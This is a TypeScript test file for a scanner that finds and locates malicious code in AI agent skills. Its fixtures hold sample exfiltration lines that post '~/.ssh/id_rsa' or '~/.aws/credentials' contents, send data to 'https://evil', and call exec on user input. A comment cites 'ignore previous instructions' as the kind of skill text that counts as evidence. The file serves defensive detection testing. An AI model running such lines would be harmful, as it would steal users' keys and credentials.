import {describe, it, expect} from "vitest";

import type {System1LocateConfig, System1ScannerConfig} from "../../config/schema.js";
import {evaluateStage1} from "../evaluate.js";
import {halves, locateFindings, type FindingLocation, type LocateTarget} from "../locate.js";
import {buildPayload, type Payload} from "../payload.js";
import {SYSTEM1_RULES} from "../rules.js";
import {createSystem1Scanner} from "../scanner.js";
import {type DecisionAnswer, type DecisionConnector, DecisionError, type DecisionResponse} from "../types.js";

// ─── Fixtures (local to this file) ─────────────────────────────────────────────────────────────
// A fake decision model: a rule fires on a text exactly when every one of its markers is in it.
// That lets each test put the evidence at a known place and check the location found.

const EXFIL = "data_exfiltration";
const CREDS = "credential_theft";
const rule = (key: string) => SYSTEM1_RULES.find((r) => r.key === key)!;

const fired = (p: boolean): DecisionAnswer => ({choice: p ? "present" : "none", probabilities: p ? {present: 0.95, none: 0.05} : {present: 0.05, none: 0.95}, confidence: 0.95});

function fakeConnector(markers: Record<string, string[]>, opts: {fail?: (text: string) => boolean} = {}) {
	const calls: {text: string; rules: string[]}[] = [];
	const connector: DecisionConnector = {
		model: "fake",
		available: () => true,
		async askRules(_name, text, rules) {
			calls.push({text, rules: rules.map((r) => r.key)});
			if (opts.fail?.(text)) throw new DecisionError("http_error", 500);
			const answers = Object.fromEntries(rules.map((r) => [r.key, fired((markers[r.key] ?? [null as unknown as string]).every((m) => m !== null && text.includes(m)))]));
			return {answers, usage: {input_tokens: text.length, output_tokens: 1, cost: 0.001}} as DecisionResponse;
		},
		async aggregate() {
			return {verdict: "HIGH", answer: null, usage: null, cost: 0};
		},
	};
	return {connector, calls};
}

const CONFIG: System1LocateConfig = {enabled: true, targetLines: 30, maxCalls: 200, concurrency: 4, budgetMs: 10_000};
const SKILL_MD = "---\nname: demo\ndescription: A demo.\n---\n# Demo\nRun the scripts.\n";

/** A file of `n` numbered filler lines, with `extra` lines placed at given 1-based line numbers. */
function file(n: number, extra: Record<number, string> = {}): string {
	return Array.from({length: n}, (_, i) => extra[i + 1] ?? `# filler ${i + 1}`).join("\n");
}

function skill(files: Record<string, string>, partChars = 1_000_000): Payload {
	return buildPayload(new Map(Object.entries({"SKILL.md": SKILL_MD, ...files})), partChars, 25);
}

/** A stage-1 evaluation that fired, on the part holding all of the rule's markers. */
function target(payload: Payload, key: string, markers: string[]): LocateTarget {
	const part = Math.max(0, payload.parts.findIndex((p) => markers.every((m) => p.text.includes(m))));
	const {evaluations} = evaluateStage1({answers: Object.fromEntries(SYSTEM1_RULES.map((r) => [r.key, fired(r.key === key)]))}, 0.5);
	return {evaluation: evaluations.find((e) => e.rule.key === key)!, part};
}

async function locate(payload: Payload, markers: Record<string, string[]>, config = CONFIG, opts = {}) {
	const {connector, calls} = fakeConnector(markers, opts);
	const targets = Object.entries(markers).map(([key, m]) => target(payload, key, m));
	const report = await locateFindings(targets, payload, {connector, skillName: "demo", marginThreshold: 0.5, config});
	return {report, calls};
}

const eight = (extra: Record<string, Record<number, string>> = {}) =>
	Object.fromEntries(["a", "b", "c", "d", "e", "f", "g", "h"].map((n) => [`${n}.py`, file(200, extra[n] ?? {})]));

// ─── Tests ─────────────────────────────────────────────────────────────────────────────────────

describe("halves", () => {
	// Narrowing must always shrink, or a range of two could loop forever.
	it("gives two overlapping halves, each smaller than the range", () => {
		for (let n = 2; n < 300; n++) {
			const [[a, b], [c, d]] = halves(0, n);
			expect(b - a).toBeLessThan(n);
			expect(d - c).toBeLessThan(n);
			expect(c).toBeLessThanOrEqual(b);
			// Strict overlap wherever it is possible, so evidence across the midpoint is never cut apart.
			if (n >= 3) expect(c).toBeLessThan(b);
		}
	});
});

describe("locateFindings", () => {
	// The point of #1229: a skill author is told which file and which lines a finding rests on.
	it("narrows to the file, then to a short line range that holds the evidence", async () => {
		const payload = skill(eight({f: {137: "requests.post(URL, data=open('~/.ssh/id_rsa').read())"}}));
		const {report} = await locate(payload, {[EXFIL]: ["requests.post(URL"]});
		const loc = report.outcomes.get(EXFIL) as FindingLocation;
		expect(loc).toMatchObject({filepath: "f.py", method: "narrowed"});
		expect(loc.lineStart).toBeLessThanOrEqual(137);
		expect(loc.lineEnd).toBeGreaterThanOrEqual(137);
		expect(loc.lineEnd! - loc.lineStart! + 1).toBeLessThanOrEqual(30);
		expect(loc.partial).toBeUndefined();
	});

	// Evidence across a split point would be lost by plain halving; the overlap keeps it whole.
	it("keeps evidence that straddles a split point", async () => {
		const payload = skill({"x.py": file(256, {128: "data = collect_all()", 129: "send(data, 'https://evil')"})});
		const {report} = await locate(payload, {[EXFIL]: ["collect_all()", "send(data"]});
		const loc = report.outcomes.get(EXFIL) as FindingLocation;
		expect(loc.filepath).toBe("x.py");
		expect(loc.lineStart).toBeLessThanOrEqual(128);
		expect(loc.lineEnd).toBeGreaterThanOrEqual(129);
		// Without overlap the first split cuts the pair apart and narrowing stops at the whole file.
		expect(loc.lineEnd! - loc.lineStart! + 1).toBeLessThanOrEqual(30);
	});

	// A read in one file and a send in another is one finding; narrowing must not pretend either
	// file alone carries it, so no single filepath is named (a reviewer sent to c.py alone finds nothing).
	it("stops at the smallest file set when the evidence needs two files, naming no single file", async () => {
		const payload = skill(eight({c: {10: "secret = read_keys()"}, d: {20: "upload(secret)"}}));
		const {report} = await locate(payload, {[EXFIL]: ["read_keys()", "upload(secret)"]});
		const loc = report.outcomes.get(EXFIL) as FindingLocation;
		expect(loc).toMatchObject({method: "file-set", files: ["c.py", "d.py"]});
		expect(loc.filepath).toBeUndefined();
	});

	// d.py and e.py sit either side of the first split of eight files; disjoint halves would lose the
	// pair and report the whole skill.
	it("keeps a file pair that straddles the first split, and marks the range as spanning", async () => {
		const payload = skill(eight({d: {10: "secret = read_keys()"}, e: {20: "upload(secret)"}}));
		const {report} = await locate(payload, {[EXFIL]: ["read_keys()", "upload(secret)"]});
		expect(report.outcomes.get(EXFIL)).toMatchObject({method: "file-set", files: ["d.py", "e.py"], spans: true});
	});

	it("says the evidence is spread across the skill when no half of the files carries it", async () => {
		const payload = skill(eight({a: {10: "secret = read_keys()"}, h: {20: "upload(secret)"}}));
		const {report} = await locate(payload, {[EXFIL]: ["read_keys()", "upload(secret)"]});
		expect(report.outcomes.get(EXFIL)).toEqual({scope: "skill"});
	});

	// Instructions can be the evidence (e.g. "ignore previous instructions").
	it("locates evidence in SKILL.md itself", async () => {
		const payload = skill(eight());
		const {report} = await locate(payload, {[EXFIL]: ["Run the scripts."]});
		const loc = report.outcomes.get(EXFIL) as FindingLocation;
		expect(loc).toMatchObject({filepath: "SKILL.md", method: "skill-md", lineStart: 1});
		expect(loc.lineEnd).toBeGreaterThanOrEqual(6);
	});

	// A file too large for one call is split into pieces; a line inside a later piece must still be
	// reported as its line in the original file.
	it("reports original line numbers for evidence in a later piece of a split file", async () => {
		const payload = skill({"big.py": file(600, {450: "exec(user_input)"})}, 4_000);
		expect(payload.parts.length).toBeGreaterThan(1);
		const {report} = await locate(payload, {[EXFIL]: ["exec(user_input)"]});
		const loc = report.outcomes.get(EXFIL) as FindingLocation;
		expect(loc.filepath).toBe("big.py");
		expect(loc.lineStart).toBeLessThanOrEqual(450);
		expect(loc.lineEnd).toBeGreaterThanOrEqual(450);
	});

	// Cost: rules waiting on the same region share one call.
	it("asks rules on the same region in one call", async () => {
		const both = "requests.post(URL, data=open('~/.aws/credentials').read())";
		const payload = skill(eight({b: {50: both}}));
		const {report, calls} = await locate(payload, {[EXFIL]: ["requests.post(URL"], [CREDS]: ["~/.aws/credentials"]});
		expect((report.outcomes.get(EXFIL) as FindingLocation).filepath).toBe("b.py");
		expect((report.outcomes.get(CREDS) as FindingLocation).filepath).toBe("b.py");
		expect(calls.every((c) => c.rules.length === 2)).toBe(true);
	});

	// The call cap bounds cost; a finding still gets the narrowest place found so far, marked partial.
	it("stops at the call cap and keeps the narrowest range found, marked partial", async () => {
		const payload = skill(eight({f: {137: "requests.post(URL"}}));
		const {report, calls} = await locate(payload, {[EXFIL]: ["requests.post(URL"]}, {...CONFIG, maxCalls: 5});
		expect(calls.length).toBeLessThanOrEqual(5);
		expect(report.stopped).toBe("max_calls");
		expect(report.outcomes.get(EXFIL)).toMatchObject({partial: true});
	});

	// A missing answer is not a "no": reading it as one names a confident range nobody confirmed.
	it("treats a rule the model left unanswered as a failed call, not as did-not-fire", async () => {
		const payload = skill({"x.py": file(100, {50: "requests.post(URL"})});
		const {connector} = fakeConnector({});
		const empty: DecisionConnector = {...connector, askRules: async () => ({answers: {}}) as DecisionResponse};
		const report = await locateFindings([target(payload, EXFIL, ["requests.post(URL"])], payload, {connector: empty, skillName: "demo", marginThreshold: 0.5, config: CONFIG});
		expect(report.outcomes.has(EXFIL)).toBe(false);
		expect(report.asks[0].unanswered).toEqual([EXFIL]);
	});

	it("stops at the last confirmed range, marked partial, when an answer goes missing mid-narrowing", async () => {
		const payload = skill(eight({f: {137: "requests.post(URL"}}));
		const {connector} = fakeConnector({[EXFIL]: ["requests.post(URL"]});
		let n = 0;
		const flaky: DecisionConnector = {...connector, askRules: async (...a) => (++n > 3 ? ({answers: {}} as DecisionResponse) : connector.askRules(...a))};
		const report = await locateFindings([target(payload, EXFIL, ["requests.post(URL"])], payload, {connector: flaky, skillName: "demo", marginThreshold: 0.5, config: CONFIG});
		expect(report.outcomes.get(EXFIL)).toMatchObject({partial: true});
	});

	// Continuation pieces of a long SKILL.md are content, not context: evidence that needs one of them
	// must not be pinned on another file alone.
	it("keeps SKILL.md continuation pieces in narrowing", async () => {
		const longMd = SKILL_MD + file(150, {140: "secret = read_keys()"});
		const payload = buildPayload(new Map([["SKILL.md", longMd], ["x.py", file(10, {5: "upload(secret)"})]]), 4_000, 25);
		expect(payload.parts[0].sections.some((s) => s.path === "SKILL.md" && s !== payload.parts[0].sections[0])).toBe(true);
		const {report} = await locate(payload, {[EXFIL]: ["read_keys()", "upload(secret)"]});
		const loc = report.outcomes.get(EXFIL);
		expect(loc && "filepath" in loc && loc.filepath === "x.py").toBe(false);
	});

	// SKILL.md was split to fit one call; the SKILL.md-alone ask must not rebuild it past that.
	it("never sends a rebuilt SKILL.md larger than one part", async () => {
		const big = buildPayload(new Map([["SKILL.md", SKILL_MD + file(2_000)], ["x.py", file(10, {5: "requests.post(URL"})]]), 4_000, 25);
		expect(big.chars).toBeGreaterThan(4 * 4_000);
		const {calls} = await locate(big, {[EXFIL]: ["requests.post(URL"]});
		expect(calls[0].text.length).toBeLessThanOrEqual(4_000 + 200);
	});

	it("leaves a finding unlocated, never throws, when the model fails", async () => {
		const payload = skill(eight({f: {137: "requests.post(URL"}}));
		const {report} = await locate(payload, {[EXFIL]: ["requests.post(URL"]}, CONFIG, {fail: () => true});
		expect(report.outcomes.has(EXFIL)).toBe(false);
		expect(report.asks.every((a) => a.error)).toBe(true);
	});
});

describe("System 1 scanner with locating", () => {
	const CFG: System1ScannerConfig = {enabled: true, model: "fake", timeoutMs: 1000, marginThreshold: 0.5, partChars: 1_000_000, maxParts: 25, locate: CONFIG};
	const files = {"SKILL.md": SKILL_MD, ...eight({f: {137: "requests.post(URL"}})};
	const stage1 = (text: string) => text.includes("SKILL.md") && text.includes("### FILE: a.py") && text.includes("### FILE: h.py");

	/** A valid stage-1 answer for any rule kind: classifications choose their first option. */
	function stage1Answer(r: (typeof SYSTEM1_RULES)[number], on: boolean): DecisionAnswer {
		if (r.kind === "classification") {
			const first = Object.keys(r.options)[0];
			return {choice: first, probabilities: {[first]: 1}, confidence: 1};
		}
		if (r.kind === "score") return {score: 0, legend: {"0": "none", "1": "mild"}, probabilities: {"0": 1}, confidence: 1};
		return fired(on);
	}

	function connector(locateFails: boolean): DecisionConnector {
		const base = fakeConnector({[EXFIL]: ["requests.post(URL"]}).connector;
		return {
			...base,
			async askRules(name, text, rules, signal) {
				if (stage1(text)) return {answers: Object.fromEntries(SYSTEM1_RULES.map((r) => [r.key, stage1Answer(r, r.key === EXFIL)]))};
				if (locateFails) throw new DecisionError("network");
				return base.askRules(name, text, rules, signal);
			},
		};
	}

	// Located findings carry the file in `filepath` and the lines in payload.location.
	it("writes the located file and lines onto the finding", async () => {
		const out = await createSystem1Scanner(CFG, connector(false)).scan({textFiles: new Map(Object.entries(files)), allPaths: Object.keys(files)});
		const f = out.findings.find((x) => x.ruleId === rule(EXFIL).ruleId)!;
		expect(f.filepath).toBe("f.py");
		expect((f.payload as {location: {method: string}}).location.method).toBe("narrowed");
		expect((out.run.rawReport as {localization: {calls: number}}).localization.calls).toBeGreaterThan(0);
	});

	const input = () => ({textFiles: new Map(Object.entries(files)), allPaths: Object.keys(files)});
	/** Everything a run reports except where findings are: what locating must never change. */
	const substance = (out: Awaited<ReturnType<ReturnType<typeof createSystem1Scanner>["scan"]>>) => ({
		status: out.run.status,
		verdict: out.run.verdict,
		findings: out.findings.map(({filepath: _f, payload, ...rest}) => {
			const {location: _l, ...p} = (payload ?? {}) as Record<string, unknown>;
			return {...rest, payload: p};
		}),
		signals: (out.signals ?? []).map(({observedAt: _o, ...rest}) => rest),
	});

	// Locating adds precision only; failing must not change the findings, the verdict or the status.
	it("keeps the run and its findings unchanged when locating fails", async () => {
		const baseline = await createSystem1Scanner({...CFG, locate: {...CONFIG, enabled: false}}, connector(false)).scan(input());
		const out = await createSystem1Scanner(CFG, connector(true)).scan(input());
		expect(substance(out)).toEqual(substance(baseline));
		expect(out.findings.find((x) => x.ruleId === rule(EXFIL).ruleId)!.filepath).toBeUndefined();
	});

	// The runner races the whole scan against [jobs].scanner_timeout_ms; locating past it would lose
	// the run and every finding, so locating is skipped when no time is left.
	it("skips locating rather than run past the scan's hard timeout", async () => {
		const out = await createSystem1Scanner(CFG, connector(false), 1_000).scan(input());
		expect(out.run.status).toBe("success");
		expect((out.run.rawReport as {localization?: unknown}).localization).toBeUndefined();
		expect(out.findings.some((x) => x.ruleId === rule(EXFIL).ruleId)).toBe(true);
	});
});
